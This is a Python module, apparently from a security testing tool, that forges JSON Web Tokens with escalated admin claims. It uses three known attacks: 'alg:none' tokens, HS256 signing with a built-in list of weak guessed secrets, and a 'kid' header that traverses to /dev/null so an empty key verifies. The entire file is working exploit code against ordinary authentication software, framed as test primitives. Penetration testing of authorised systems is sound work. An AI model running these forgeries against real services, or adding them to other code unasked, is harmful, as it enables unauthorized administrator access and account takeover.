"""JWT forgery primitives for testing token acceptance (stdlib only, no PyJWT dep)."""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from typing import Any


def _b64u(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _seg(obj: dict[str, Any]) -> str:
    return _b64u(json.dumps(obj, separators=(",", ":")).encode())


WEAK_SECRETS: tuple[str, ...] = (
    "secret", "jwt", "admin", "password", "123456", "key", "changeme", "test",
    "your-256-bit-secret", "supersecret", "jwtsecret", "s3cr3t", "private",
    "jwt_secret", "default", "secretkey", "qwerty",
)


def decode_payload(token: str) -> dict[str, Any]:
    """Decode a JWT's claims without verifying, or {} if it cannot be parsed."""
    try:
        seg = token.split(".")[1]
        seg += "=" * (-len(seg) % 4)
        out = json.loads(base64.urlsafe_b64decode(seg))
        return out if isinstance(out, dict) else {}
    except Exception:
        return {}


def _escalated(base: dict[str, Any] | None = None) -> dict[str, Any]:
    """Copy base claims and overlay admin roles plus fresh iat/exp."""
    now = int(time.time())
    p: dict[str, Any] = dict(base or {})
    p.setdefault("sub", p.get("user_id", p.get("id", "1")))
    p.update({
        "role": "admin", "admin": True, "isAdmin": True, "scope": "admin",
        "roles": ["admin"], "iat": now, "exp": now + 3600,
    })
    return p


def forge_none(base_payload: dict[str, Any] | None = None) -> str:
    return f"{_seg({'alg': 'none', 'typ': 'JWT'})}.{_seg(_escalated(base_payload))}."


def forge_hs256(secret: str, base_payload: dict[str, Any] | None = None) -> str:
    header = _seg({"alg": "HS256", "typ": "JWT"})
    payload = _seg(_escalated(base_payload))
    sig = hmac.new(secret.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest()
    return f"{header}.{payload}.{_b64u(sig)}"


def forge_kid_traversal(base_payload: dict[str, Any] | None = None) -> str:
    """Forge an HS256 token whose kid points at /dev/null, signed with an empty key.

    Targets servers that load the HMAC key from the kid path: an empty-file key
    makes the empty-secret signature verify.
    """
    header = _seg({"alg": "HS256", "typ": "JWT", "kid": "../../../../../../dev/null"})
    payload = _seg(_escalated(base_payload))
    sig = hmac.new(b"", f"{header}.{payload}".encode(), hashlib.sha256).digest()
    return f"{header}.{payload}.{_b64u(sig)}"


def forged_tokens(approach: str, base_payload: dict[str, Any] | None = None) -> list[tuple[str, str]]:
    """Return (label, token) pairs for one attack approach, or [] if unknown.

    The weak-secret approach yields one candidate per entry in WEAK_SECRETS.
    """
    if approach == "jwt_none_alg":
        return [("alg:none", forge_none(base_payload))]
    if approach == "jwt_kid_inject":
        return [("kid:/dev/null", forge_kid_traversal(base_payload))]
    if approach == "jwt_weak_secret":
        return [(f"hs256:{s}", forge_hs256(s, base_payload)) for s in WEAK_SECRETS]
    return []
